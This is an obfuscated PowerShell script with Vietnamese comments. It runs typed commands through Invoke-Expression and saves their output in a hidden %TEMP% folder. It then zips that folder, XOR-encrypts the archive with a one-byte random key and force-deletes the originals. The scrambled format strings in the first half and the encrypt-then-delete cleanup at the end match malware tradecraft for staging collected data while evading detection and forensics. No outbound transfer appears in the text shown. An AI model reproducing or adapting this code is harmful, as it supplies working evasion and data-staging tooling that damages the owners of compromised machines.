${out`pUtDIR`ECT`Ory} = .("{0}{1}{2}"-f'Jo','in-Pat','h') ${eNV`:tEMP} ("{6}{5}{8}{3}{4}{2}{7}{1}{0}" -f '2','0','d','6905b1ceaa','1','6b34','bee9','49','68e219f0')

if (-not (.("{2}{1}{0}" -f 'th','-Pa','Test') -Path ${oU`Tpu`TD`IrE`CtORY} -PathType ("{1}{2}{3}{0}"-f'ner','C','ont','ai'))) {
    .("{2}{1}{0}"-f'em','w-It','Ne') -ItemType ("{0}{1}{2}" -f 'Dir','ecto','ry') -Path ${OUt`pUTDI`RE`C`TOrY} -Force
}

while (${t`Rue}) {
    ${Co`mM`And} = &("{0}{1}{2}" -f'Read','-Ho','st') ((("{6}{1}{5}{2}{7}{4}{3}{0}{8}" -f '0}exit{0} to qu','er','comman','{',' ',' a ','Ent','d (Type','it):'))-f [ChaR]39)

    if (${COM`M`AnD} -eq ("{1}{0}" -f't','exi')) {
        break
    }

    try {
        ${Out`puT} = .("{2}{3}{1}{0}{4}"-f 's','pres','Invo','ke-Ex','ion') -Command ${Co`mma`Nd}

        ${OUTP`Utf`IL`EPaTH} = &("{0}{2}{1}"-f 'Join','ath','-P') ${OuT`pUtD`i`Rect`OrY} "output_$(Get-Date -Format 'yyyyMMddHHmmss').txt "
        ${ouT`p`Ut} | &("{0}{2}{1}"-f'Out-F','le','i') -FilePath ${outpu`TFI`LepA`TH} -Encoding ("{1}{0}"-f'8','UTF')

    }
    catch {
    }
}

$sourceFolderPath = ${out`pUtDIR`ECT`Ory}

# Đường dẫn đến thư mục bạn muốn nén
# $sourceFolderPath = "$env:temp\bee96b3468e219f06905b1ceaa1d4902"

# Đường dẫn và tên cho tệp ZIP kết quả
$outputZipFilePath = "$env:temp\bee96b3468e219f06905b1ceaa1d4902.zip"

# Tạo một byte key ngẫu nhiên
$random = New-Object System.Random
$key = $random.Next(0, 256)

# Nén thư mục thành tệp ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolderPath, $outputZipFilePath)

# Đọc tệp ZIP đã nén
$zipBytes = [System.IO.File]::ReadAllBytes($outputZipFilePath)

# Mã hóa tệp ZIP bằng XOR với key
for ($i = 0; $i -lt $zipBytes.Length; $i++) {
    $zipBytes[$i] = $zipBytes[$i] -bxor $key
}

# Tạo tên và đường dẫn cho tệp đã mã hóa
$outputEncryptedFilePath = "$env:temp\bee96b3468e219f06905b1ceaa1d4902_.zip"

# Ghi tệp đã mã hóa ra file
$stream = [System.IO.File]::Create($outputEncryptedFilePath)
$stream.Write($key, 0, 1)
$stream.Write($zipBytes, 0, $zipBytes.Length)
$stream.Close()
Remove-Item -Path $sourceFolderPath -Recurse -Force
Get-ChildItem -Path $outputZipFilePath | Remove-Item -Force
# Hiển thị thông báo khi hoàn thành
# Write-Host "File đã được nén và mã hóa thành công tại: $outputEncryptedFilePath"
